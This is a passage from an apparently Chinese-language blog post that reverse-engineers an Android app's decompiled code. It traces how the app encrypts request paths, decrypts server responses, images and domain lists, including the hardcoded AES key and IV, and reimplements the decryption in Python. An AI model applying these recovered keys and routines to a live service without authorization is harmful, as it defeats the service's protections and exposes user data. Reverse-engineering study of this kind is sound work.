class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; charArray.length; i++) &#123;</span><br><span class="line">            charArray[i] = (<span class="type">char</span>) (charArray[i] ^ <span class="string">&#x27;\u2efd&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> String.valueOf(charArray);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">severApiFilter</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (TextUtils.isEmpty(str)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (String str2 : apiPaths) &#123;</span><br><span class="line">            <span class="keyword">if</span> (str.equals(str2)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">decodeS3Image</span><span class="params">(File file, File file2)</span> &#123;</span><br><span class="line">        Throwable th;</span><br><span class="line">        FileOutputStream fileOutputStream;</span><br><span class="line">        FileInputStream fileInputStream;</span><br><span class="line">        Exception e;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">fileInputStream = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">fileOutputStream = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file2);</span><br><span class="line"><span class="type">byte</span>[] bArr = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1</span>];</span><br><span class="line"><span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">read</span> <span class="operator">=</span> fileInputStream.read(bArr);</span><br><span class="line"><span class="keyword">if</span> (read == -<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (b == -<span class="number">1</span>) &#123;</span><br><span class="line">b = bArr[<span class="number">0</span>];</span><br><span class="line">bArr = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0x1000</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">byte</span>[] bArr2 = <span class="keyword">new</span> <span class="title class_">byte</span>[read];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; read; i++) &#123;</span><br><span class="line">bArr2[i] = (<span class="type">byte</span>) (bArr[i] ^ b);</span><br><span class="line">&#125;</span><br><span class="line">fileOutputStream.write(bArr2);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fileInputStream.close();</span><br><span class="line">fileOutputStream.flush();</span><br><span class="line">fileOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encodePath</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> System.currentTimeMillis() + RandomUtil.getRandom(<span class="number">3</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64Util.base64EncodeStr((AESUtil.encryptAES(str + (<span class="type">char</span>) <span class="number">1</span> + RandomUtil.getRandom(<span class="number">1</span>), str2) + (<span class="type">char</span>) <span class="number">1</span> + Base64Util.base64EncodeStr(str2, <span class="number">8</span>)).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>), <span class="number">8</span>)).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;.do&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据方法名一眼就看出这里面的三个操作：解码服务器的响应，解密s3类型的图片，请求路径加密。</p><h4 id="请求路径加密"><a href="#请求路径加密" class="headerlink" title="请求路径加密"></a>请求路径加密</h4><p>虽然从方法名字就能看出具体操作，但因为反编译器和垃圾项目的一些问题，现在还不敢确定。<br>同时对照着JEB反汇编出来的垃圾结果看看，没大有作用，不过不至于一叶障目。<br>那就首先来看一下<code>encodePath</code>都是谁调用的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@HttpRequest(builder = TomatoParamsBuilder.class, host = &quot;http://www.fanqie345.com&quot;, path = &quot;xxx&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomatoParams</span> <span class="keyword">extends</span> <span class="title class_">RequestParams</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String path;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TomatoParams</span><span class="params">(String str, String str2, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(str + AppSecretUtil.encodePath(str2));</span><br><span class="line">        <span class="built_in">this</span>.path = str2;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> i * <span class="number">1000</span>;</span><br><span class="line">        setReadTimeout(i2);</span><br><span class="line">        setConnectTimeout(i2);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; Callback.Cancelable <span class="title function_">post</span><span class="params">(TomatoCallback tomatoCallback)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            init();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable th) &#123;</span><br><span class="line">            th.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x.http().post(<span class="built_in">this</span>, tomatoCallback);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再来看一下<code>TomatoParams</code>都被谁使用了，通过搜索发现有很多的view或者fragement，基本可以确定，这就是路径的编码算法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">shield</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> i2)</span> &#123;</span><br><span class="line">    <span class="type">TomatoParams</span> <span class="variable">tomatoParams</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TomatoParams</span>(DomainServer.getInstance().getServerUrl(), <span class="string">&quot;/app/record/shield/add&quot;</span>);</span><br><span class="line">    tomatoParams.addParameter(<span class="string">&quot;createMemberId&quot;</span>, Integer.valueOf(DBUtil.getMemberId()));</span><br><span class="line">    tomatoParams.addParameter(<span class="string">&quot;type&quot;</span>, Integer.valueOf(i));</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">1</span>) &#123;</span><br><span class="line">        tomatoParams.addParameter(<span class="string">&quot;memberId&quot;</span>, Integer.valueOf(<span class="built_in">this</span>.postList.getMemberId()));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="number">2</span>) &#123;</span><br><span class="line">        tomatoParams.addParameter(<span class="string">&quot;articleId&quot;</span>, Integer.valueOf(<span class="built_in">this</span>.postList.getId()));</span><br><span class="line">    &#125;</span><br><span class="line">    tomatoParams.post(<span class="keyword">new</span> <span class="title class_">TomatoCallback</span>((ResponseObserver) <span class="built_in">this</span>, <span class="number">1</span>, (Class) <span class="literal">null</span>, i, i2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大部分调用的方式都是类似的，最开始是编码请求路径，然后自定义的添加一些头部的参数，然后用<code>post</code>发出请求。<br>这里注意：<code>TomatoCallback</code>这个方法是用来处理返回的数据的。这很重要。<br>下面来看一下<code>encodePath</code>的加密过程吧。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AESUtil</span> &#123;</span><br><span class="line">    <span class="meta">@NonNull</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encryptAES</span><span class="params">(String str, String str2)</span> <span class="keyword">throws</span> InvalidKeyException, NoSuchAlgorithmException, NoSuchPaddingException, UnsupportedEncodingException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (TextUtils.isEmpty(str)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = str.getBytes(Base64Coder.CHARSET_UTF8);</span><br><span class="line">        <span class="type">SecretKeySpec</span> <span class="variable">secretKeySpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(str2.getBytes(), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        <span class="type">IvParameterSpec</span> <span class="variable">ivParameterSpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(<span class="string">&quot;16-Bytes--String&quot;</span>.getBytes());</span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">instance</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">        instance.init(<span class="number">1</span>, secretKeySpec, ivParameterSpec);</span><br><span class="line">        <span class="keyword">return</span> Base64Util.base64EncodeData(instance.doFinal(bytes));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>再看<code>encodePath</code>方法，发现其实是可以自解密的，信息完备。</p><h4 id="DomainRequest"><a href="#DomainRequest" class="headerlink" title="DomainRequest"></a>DomainRequest</h4><p>通过刚才调查是谁调用了<code>TomatoParams</code>发现了一个很有意思的方法：<code>DomainServer.getInstance().getServerUrl()</code><br>根据字面意思，这应该是获取服务器地址的方法。来看一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DomainServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> DomainServer domainServer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> String <span class="title function_">getCurrentServerUrl</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">domainUrlByType</span> <span class="operator">=</span> DomainRequest.getInstance().getDomainUrlByType(str);</span><br><span class="line">        <span class="keyword">if</span> (!domainUrlByType.endsWith(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">            domainUrlByType = domainUrlByType + <span class="string">&quot;/&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;ttViewPicture&quot;</span>.equals(str) &amp;&amp; !<span class="string">&quot;ttViewVideoNew&quot;</span>.equals(str) &amp;&amp; !<span class="string">&quot;jcAgent&quot;</span>.equals(str) &amp;&amp; !<span class="string">&quot;h5Domain&quot;</span>.equals(str) &amp;&amp; !<span class="string">&quot;spreadDomain&quot;</span>.equals(str) &amp;&amp; !<span class="string">&quot;website&quot;</span>.equals(str) &amp;&amp; !<span class="string">&quot;websiteYule&quot;</span>.equals(str) &amp;&amp; !<span class="string">&quot;shareDomain&quot;</span>.equals(str)) &#123;</span><br><span class="line">            <span class="keyword">return</span> domainUrlByType;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> subStringUrlByLine(domainUrlByType);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>啥事没干，又调用了<code>DomainRequest</code>，接着看：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DomainRequest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">synchronized</span> ArrayList&lt;DomainUrl&gt; <span class="title function_">getDomainListByType</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sDCardDomainDir</span> <span class="operator">=</span> getSDCardDomainDir();</span><br><span class="line">        <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="built_in">this</span>.fileNameMap.get(str);</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(FileUtil.getDomainDir(sDCardDomainDir), str2);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str3</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (file.exists()) &#123;</span><br><span class="line">            str3 = FileUtil.readSDCardData(file.getPath());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (TextUtils.isEmpty(str3)) &#123;</span><br><span class="line">            <span class="type">StringBuffer</span> <span class="variable">stringBuffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">            stringBuffer.append(sDCardDomainDir);</span><br><span class="line">            stringBuffer.append(File.separator);</span><br><span class="line">            stringBuffer.append(str2);</span><br><span class="line">            str3 = FileUtil.readAssetFile(stringBuffer.toString());</span><br><span class="line">            FileUtil.writeSDCardData(file.getPath(), str3);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (TextUtils.isEmpty(str3)) &#123;</span><br><span class="line">            LogUtil.e(<span class="string">&quot;getDomainListByType ==&gt;&gt; 没有获取到加密数据&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ArrayList&lt;DomainUrl&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (!decrypt(str, str3, arrayList)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.urlMap.put(str, arrayList);</span><br><span class="line">        <span class="keyword">return</span> arrayList;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">decrypt</span><span class="params">(String str, String str2, ArrayList&lt;DomainUrl&gt; arrayList)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">decryptAES</span> <span class="operator">=</span> AESUtil.decryptAES(str2, <span class="string">&quot;WTSecret81234512&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (TextUtils.isEmpty(decryptAES)) &#123;</span><br><span class="line">                LogUtil.e(<span class="string">&quot;解密：domainType = &quot;</span> + str + <span class="string">&quot;, 没有获取到加密数据&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                String[] split = decryptAES.split(<span class="string">&quot;\\|&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">str3</span> <span class="operator">=</span> split[<span class="number">0</span>];</span><br><span class="line">                <span class="type">String</span> <span class="variable">str4</span> <span class="operator">=</span> split[<span class="number">1</span>];</span><br><span class="line">                String[] split2 = str3.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">                String[] split3 = str4.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; split2.length; i++) &#123;</span><br><span class="line">                    arrayList.add(<span class="keyword">new</span> <span class="title class_">DomainUrl</span>(RSAUtil.RSAdecrypt(<span class="string">&quot;RSAPRIVATEKEY&quot;</span>, split2[i]), Integer.parseInt(RSAUtil.RSAdecrypt(<span class="string">&quot;RSAPRIVATEKEY&quot;</span>, split3[i]))));</span><br><span class="line">                &#125;</span><br><span class="line">                LogUtil.i(<span class="string">&quot;解密：domainType = &quot;</span> + str + <span class="string">&quot;，domainUrlList = &quot;</span> + arrayList.toString());</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e2) &#123;</span><br><span class="line">            e2.printStackTrace();</span><br><span class="line">            LogUtil.e(<span class="string">&quot;解密：domainType = &quot;</span> + str + <span class="string">&quot;, 解密报异常&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好了，终于知道最开始第一条请求的数据该如何解密了，但后面还带有一个整数，这个数代表该服务器的权重。</p><h4 id="TomatoCallback"><a href="#TomatoCallback" class="headerlink" title="TomatoCallback"></a>TomatoCallback</h4><p>既然存在对路径的编码，那自然调用它的应该是请求的方法，有了请求的方法，在沿线估计就可以找到解密服务器响应的方法。<br>就是上面这种思路帮助我在这篇代码中找到需要的加密和解密方式。<br>再来看<code>TomatoParams.post()</code>这个方法的调用，这个方法带一个参数，用于回调。<br>回调方法的用途便是处理服务器返回的数据，在众多<code>TomatoParams</code>的调用中，一个回调类被频繁使用。<br>来看一下<code>TomatoCallback</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomatoCallback</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">Callback</span>.CommonCallback&lt;String&gt;, RequestInterceptListener &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSuccess</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        String str2;</span><br><span class="line">        String str3;</span><br><span class="line">        String str4;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="keyword">if</span> (AppSecretUtil.severApiFilter(<span class="built_in">this</span>.filterPath) || (i = <span class="built_in">this</span>.msg.arg1) == <span class="number">111111</span> || i == <span class="number">222222</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">tag</span> <span class="operator">=</span> getTAG();</span><br><span class="line">            LogUtil.i(tag, <span class="string">&quot;无需解密的：&quot;</span> + str);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            str = AppSecretUtil.decodeResponse(str);</span><br><span class="line">            <span class="type">String</span> <span class="variable">tag2</span> <span class="operator">=</span> getTAG();</span><br><span class="line">            LogUtil.i(tag2, <span class="string">&quot;解密后的：&quot;</span> + str);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 省略众多行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里终于证实了<code>AppSecretUtil</code>的重要性了。<br>下面把这些加密的数据用python实现解密。</p><h4 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h4><p>下面用python把里面用到的加密都解密一遍，这个过程走了很多弯路，尤其是**decoderesponce()**搞了4小时！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5, AES, DES3</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA1</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Appdec</span>:</span><br><span class="line"> </span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">unpad5</span>(<span class="params">s</span>):</span><br><span class="line">        <span class="keyword">return</span> s[<span class="number">0</span>:-s[-<span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decodepath</span>(<span class="params">self, encp</span>):</span><br><span class="line">        dp = b64decode(<span class="built_in">bytes</span>(encp, <span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">        al = dp.split(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">        key = b64decode(al[<span class="number">1</span>])</span><br><span class="line">        iv = <span class="string">b&#x27;16-Bytes--String&#x27;</span></span><br><span class="line">        cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">        ud = cipher.decrypt(b64decode(al[<span class="number">0</span>]))</span><br><span class="line">        decrypted = self.unpad5(ud)[:-<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">return</span> decrypted.decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decodes3</span>(<span class="params">encf, decf</span>):</span><br><span class="line">        s3 = <span class="built_in">open</span>(encf, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        ba = <span class="built_in">bytearray</span>()</span><br><span class="line">        b = s3.read(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            ch = s3.read(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> ch:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            ba.append(<span class="built_in">ord</span>(ch) ^ <span class="built_in">ord</span>(b))</span><br><span class="line">        d3 = <span class="built_in">open</span>(decf, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        d3.write(ba)</span><br><span class="line">        s3.close()</span><br><span class="line">        d3.close()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrsa</span>(<span class="params">pri, ciphertext</span>):</span><br><span class="line">        key = RSA.importKey(pri)</span><br><span class="line">        dsize = SHA1.digest_size</span><br><span class="line">        input_text = ciphertext[:<span class="number">256</span>]</span><br><span class="line">        ret = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> input_text:</span><br><span class="line">            sentinel = Random.new().read(<span class="number">15</span> + dsize)</span><br><span class="line">            cipher = PKCS1_v1_5.new(key)</span><br><span class="line">            _message = cipher.decrypt(input_text, sentinel)</span><br><span class="line">            ret += _message</span><br><span class="line">            ciphertext = ciphertext[<span class="number">256</span>:]</span><br><span class="line">            input_text = ciphertext[:<span class="number">256</span>]</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decodelive</span>(<span class="params">self, encdata, enckey</span>):</span><br><span class="line">        bencdata = <span class="built_in">bytes</span>(encdata, <span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        benckey = <span class="built_in">bytes</span>(enckey, <span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;prilive.pem&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            pri = f.read()</span><br><span class="line">            deckey = self.decrsa(pri, b64decode(benckey))</span><br><span class="line">            ct = b64decode(bencdata)</span><br><span class="line">            cipher = DES3.new(deckey[:<span class="number">24</span>], DES3.MODE_CBC, iv=<span class="string">b&#x27;01234567&#x27;</span>)</span><br><span class="line">            plain = cipher.decrypt(ct).decode(<span class="string">&#x27;utf8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">            plain = plain[:plain.rfind(<span class="string">&#x27;&#125;&#x27;</span>) + <span 